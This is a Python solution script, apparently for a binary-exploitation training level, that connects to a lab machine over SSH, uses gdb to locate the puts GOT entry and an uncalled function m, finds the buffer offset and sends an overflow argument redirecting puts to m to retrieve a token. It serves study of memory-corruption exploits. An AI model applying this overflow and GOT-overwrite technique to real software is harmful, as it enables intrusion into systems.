import os
import sys
bool('Ressources' in os.getcwd()) if sys.path.append("../") else sys.path.append("../..")
from utils.ssh import exec, connect_by_previous, find_offset, get_func_address, get_func_structure
from utils.text import print_output, print_title
from utils.base import save_token, get_buffer_overflow_command, address_to_string

client = connect_by_previous()

files_list = exec(client, 'ls', title='Get files list')
print_output(files_list, 'Files')
print_title('Test this file')

binary_name = files_list[0]

output = exec(client, f'./{binary_name}', title='Simple execute binary', err=True)
print_output(output, 'Output')
print_title('Segfault, sad')

output = exec(client, f'./{binary_name} test', title='Send one arg')
print_output(output, 'Output')
print_title('Segfault')

output = exec(client, f'./{binary_name} test test', title='Send two arg')
print_output(output, 'Output')
print_title('Okay, 2+ arg expected got it')
print_title('Debug Time')

func_info = exec(
    client, f'echo "info func" | gdb ./{binary_name} -q | egrep " main$| m$"', title='Get all functions')
print_output(func_info)
print_title('We have two entry points')

get_func_structure(client, 'main', 'Open file (+178) and save output in global variable (+202), function M never called')
get_func_structure(client, 'm', 'Print time (+13) and print global variable where was the result saved from main (+27)')

puts_address = exec(
    client, f'echo "info func puts" | gdb ./{binary_name} -q | grep "puts@plt"', title='Get puts address')[0]
print_output(puts_address)
print_title('It pointer, search deeper')

puts_address = puts_address.split(' ')[0]
puts_address = exec(
    client, f'echo "x/i {puts_address}" | '
            f'gdb ./{binary_name} -q | '
            f'grep "puts@plt" | '
            f'sed \'s/(gdb)//\' | '
            f'awk \'{{print $4}}\' | '
            f'sed \'s/*//\'',
    title='Get puts address')[0]
print_output(puts_address, 'Puts address')

m_address = get_func_address(client, 'm')
print_title(f'Oks, we can replace puts call {puts_address} by call m {m_address} function')

offset = find_offset(client, register='eax', title='Find buffer offset')

output = exec(client, f'./{binary_name} '
                      f'$({get_buffer_overflow_command(offset, puts_address)}) '
                      f'$(echo -e -n "{address_to_string(m_address)}")')
print_output(output)

save_token(output[0], client)
